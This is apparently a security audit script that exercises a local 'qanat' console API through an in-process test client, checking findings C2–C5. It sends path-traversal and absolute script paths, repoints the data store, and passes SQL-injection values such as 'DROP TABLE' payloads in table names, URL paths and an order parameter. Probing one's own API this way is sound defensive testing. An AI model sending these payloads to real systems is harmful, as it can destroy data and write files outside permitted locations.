"""C3/C4: what the console API will accept into the project file and onto disk."""
import json, pathlib, shutil, tempfile, sys
from fastapi.testclient import TestClient
from qanat.api import AppState, create_app
from qanat.project import load
from qanat.store import Store

src = pathlib.Path(sys.argv[1])
tmp = pathlib.Path(tempfile.mkdtemp()) / "proj"
shutil.copytree(src, tmp)
outside = tmp.parent / "OUTSIDE"
outside.mkdir()

project, root = load(tmp)
store = Store(project.store_url(root))
app = create_app(AppState(store=store, project=project, root=root, sched=None))
c = TestClient(app)

def show(label, r):
    body = r.text[:180].replace("\n", " ")
    print(f"  [{r.status_code}] {label}: {body}")

print("== C3: script path traversal (writes a file outside the project) ==")
show("script ../../OUTSIDE/pwned.py", c.post("/api/steps", json={
    "id": "evil", "from": ["raw.bars"], "to": ["features.evil"],
    "script": "../OUTSIDE/pwned.py"}))
print("   file created outside root:", (outside / "pwned.py").is_file())

print("== C3b: absolute script path ==")
show("script /tmp/abs_pwned.py", c.post("/api/steps", json={
    "id": "evil2", "from": ["raw.bars"], "to": ["features.evil2"],
    "script": "/tmp/qanat_abs_pwned.py"}))
print("   abs file created:", pathlib.Path("/tmp/qanat_abs_pwned.py").is_file())

print("== C2: SQL-injecting table name accepted into the file ==")
show("to: features.evil\";DROP...", c.post("/api/steps", json={
    "id": "inj", "from": ["raw.bars"],
    "to": ['features.z" AS SELECT 1; DROP TABLE "main"."raw__bars"; CREATE OR REPLACE TABLE "main"."features__pwn'],
    "script": "steps/normalize.sql"}))

print("== C4: repoint the store anywhere ==")
show("store=/tmp/qanat_elsewhere.duckdb", c.put("/api/store", json={"store": "/tmp/qanat_elsewhere.duckdb"}))
show("store=../OUTSIDE/x.duckdb", c.put("/api/store", json={"store": "../OUTSIDE/x.duckdb"}))

print("== C5: /api/table SQL injection through the path ==")
show("stage=raw name=bars\" --", c.get('/api/table/raw/bars" --'))
show("order=1;DROP", c.get("/api/table/raw/bars", params={"order": "1); DROP TABLE raw__bars--"}))

print("\nresulting qanat.yaml steps:")
print(pathlib.Path(tmp / "qanat.yaml").read_text()[-900:])
